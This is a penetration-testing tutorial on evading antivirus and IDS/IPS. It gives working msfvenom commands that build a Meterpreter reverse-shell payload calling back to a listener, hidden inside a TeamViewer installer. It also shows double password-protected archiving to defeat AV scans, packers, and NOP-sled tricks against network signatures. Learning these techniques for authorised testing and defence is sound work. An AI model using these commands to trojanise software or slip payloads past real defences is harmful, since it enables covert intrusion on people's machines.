# Firewall and IDS/IPS Evasion

Understanding how defences function is a prerequisite for understanding how to work around them. Network and host-level security products each operate on different layers and detection models, and a technique that defeats one will not necessarily defeat the other. Effective evasion during a real engagement requires understanding which detection layer each product operates on, and applying the appropriate technique to bypass that specific layer rather than applying a single universal approach.

## Layers of Protection

Security products are broadly divided into two deployment categories:

**Endpoint protection** is software installed directly on a host. It monitors the local filesystem, running processes, and memory for malicious content. Common examples include [Avast](https://www.avast.com/), [ESET NOD32](https://www.eset.com/), [Malwarebytes](https://www.malwarebytes.com/), and [BitDefender](https://www.bitdefender.com/), each bundling antivirus, antimalware, a host-based firewall, and anti-ransomware capabilities into a single agent.

**Perimeter protection** consists of physical or virtualised devices positioned at network boundary points, typically between the public internet and internal corporate zones. These devices inspect traffic as it crosses the boundary rather than examining individual host processes. Many enterprise networks also include a DMZ (De-Militarized Zone) between the external internet and the internal network, hosting public-facing services that must be reachable externally whilst still being managed and patched from the inside.

## Detection Methods

All security policies, regardless of product type, operate on the same fundamental principle: a list of allow and deny entries evaluated against an object or event. What distinguishes products from each other is the method used to generate those evaluation decisions:

| Detection Method | How It Works |
|---|---|
| **Signature-based detection** | Compares packets, files, or process characteristics against a database of known attack patterns. A 100% match triggers an alert. Fast and reliable against known threats; blind to anything not yet in the database. |
| **Heuristic / statistical anomaly detection** | Establishes a behavioural baseline for normal network and host activity, then alerts on deviations beyond a defined threshold. Effective against novel attacks but prone to false positives on unusual-but-legitimate behaviour. |
| **Stateful protocol analysis** | Compares observed protocol behaviour against pre-defined models of acceptable protocol use. Detects protocol abuse and malformed packet sequences that signature-based detection would miss. |
| **Live SOC monitoring** | Human analysts backed by SIEM tooling and alert dashboards review live telemetry and make manual triage decisions, either acting directly or enabling automated responses based on observed patterns. |

## Meterpreter's Built-in Evasion Properties

Several of Meterpreter's architectural characteristics directly address the most common detection methods:

- **AES-encrypted C2 traffic:** All Meterpreter communication in MSF6 is AES-encrypted end-to-end over a TLV channel. This prevents network-based IDS/IPS from inspecting payload content within the traffic stream, as the data is indistinguishable from other encrypted communications.
- **In-memory execution:** Because Meterpreter resides entirely in memory and writes nothing to disk, file-based signature scanning on the target's filesystem finds no artefact to match against.
- **Process injection:** Meterpreter injects into an existing process rather than creating a new one, making process-listing-based detection ineffective against it.

These properties handle two of the three main detection surfaces: the network channel and the filesystem. The third surface, the payload file itself before it is executed, remains the primary risk and requires separate evasion techniques.

## Executable Templates

MSFVenom's `-x` flag allows any legitimate executable to be used as a template into which the payload shellcode is injected. The resulting file retains the structure and visual identity of the original application, embedding the malicious shellcode within the legitimate application's binary body:

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe -i 5

x86/shikata_ga_nai chosen with final size 135
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```

The `-k` flag instructs MSFVenom to preserve the original application's execution flow and run the payload as a separate thread, so the template application launches normally while the payload executes in the background. However, `-k` is only reliably supported on older 32-bit Windows targets such as Windows XP. On modern targets, the template will execute but the thread separation behaviour may not function as expected, meaning the user may observe an unexpected secondary window if they launch the backdoored executable from a command prompt rather than via a GUI double-click.

The underlying principle is that there are many valid combinations of legitimate executable templates, encoding schemes, encoding iterations, and payload variants. Each unique combination produces a distinct binary structure, increasing the likelihood that the result does not match any existing signature in an AV engine's database.

## Archive-Based Evasion

Password-protected archives prevent AV engines from decompressing and inspecting their contents. Most AV scanning engines, whether on-access endpoint scanners or network gateway scanners, cannot decrypt a password-protected archive to examine the file inside it. The scanner typically marks the archive as unscannable and raises a low-severity informational alert rather than a malicious-file alert, leaving it to an administrator to manually inspect.

Applying two layers of password-protected archiving with extension removal at each stage further complicates automated analysis:

```bash
# Generate the payload
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

# First archive layer with password, then remove the extension
rar a ~/test.rar -p ~/test.js
mv test.rar test

# Second archive layer wrapping the extension-stripped first archive
rar a test2.rar -p test
mv test2.rar test2
```

Submitting the raw `test.js` payload to VirusTotal detected it with 11 of 59 engines, with hits from AVG, Avast, BitDefender, ClamAV, FireEye, and Emsisoft among others. All detections specifically named the Shikata Ga Nai encoder pattern rather than the underlying Meterpreter payload. After the double-archive process, the same payload produced 0 detections across 49 engines.

The tradeoff is that the administrator's AV dashboard will log the archive as unscanned due to password protection, which may itself attract manual attention in a security-conscious environment. Some gateway-level AV products also attempt to extract passwords from adjacent email or message body text, so delivery context matters.

## Packers

A packer compresses the original executable and bundles it with a decompression stub into a single output file. At runtime, the stub decompresses the original binary back into memory and transfers execution to it. From the user's perspective, the application runs normally. From the AV engine's perspective, the file on disk does not match the signature of the original executable because its byte structure has been entirely transformed by the compression and encryption layer.

Commonly used packers include:

- [UPX](https://upx.github.io/): Open-source, widely supported, fast compression; well-known to AV vendors and detectable in its default configuration, but can be customised.
- [The Enigma Protector](https://enigmaprotector.com/): Commercial protector with virtualisation, licensing, and anti-debug capabilities in addition to packing.
- [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm): Lightweight packer with LZMA compression; less widely analysed than UPX.
- Themida, MEW, Morphine, ExeStealth: Specialised packers targeting different aspects of static and dynamic analysis evasion.

Because packers are themselves identifiable by their stub code, using a well-known packer without modification may trigger a heuristic detection. Custom-modified or lesser-known packers offer better results. The [PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf) provides detailed academic analysis of how packer diversity affects AV detection rates.

## Exploit Code Obfuscation

Buffer overflow exploit code sent across the network is identifiable by its characteristic hexadecimal buffer patterns and NOP sled sequences. IDS/IPS systems maintain signature databases for common BoF buffer layouts, and a byte-for-byte match against a known exploit pattern will trigger an alert before the payload reaches the target.

Two techniques reduce the detectability of exploit traffic at the network layer:

**Offset randomisation:** Adding a configurable `Offset` parameter to the module's `Targets` block means the return address and buffer layout can vary between runs:

```ruby
'Targets' =>
[
  [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

**NOP sled alternatives:** Standard NOP (`\x90`) sleds are one of the most commonly fingerprinted patterns in network-level IDS signatures. Replacing a uniform NOP sled with equivalent single-byte instructions that also perform no meaningful computation, such as `\x41` (INC EAX) or `\x43` (INC EBX), produces functionally equivalent sleds that do not match the `\x90` signature pattern.

Both techniques should be validated in a sandboxed environment before deployment in a real assessment, particularly because exploit delivery may only be attempted once before the target service crashes, patches, or the security team responds.

## Evasion in Context

This section covers the foundational layer of evasion: transforming and packaging payloads to reduce static detection. It is important to treat the VirusTotal detection scores shown here as directional baselines rather than definitive assessments. A 0/49 score in VirusTotal does not guarantee evasion against a deployed EDR product, as many EDR solutions rely on behavioural analysis, in-memory scanning, and kernel telemetry rather than file-based signatures, none of which VirusTotal tests. Deeper evasion techniques including custom loaders, direct syscall usage, process hollowing, and AMSI bypass are topics for later dedicated modules.
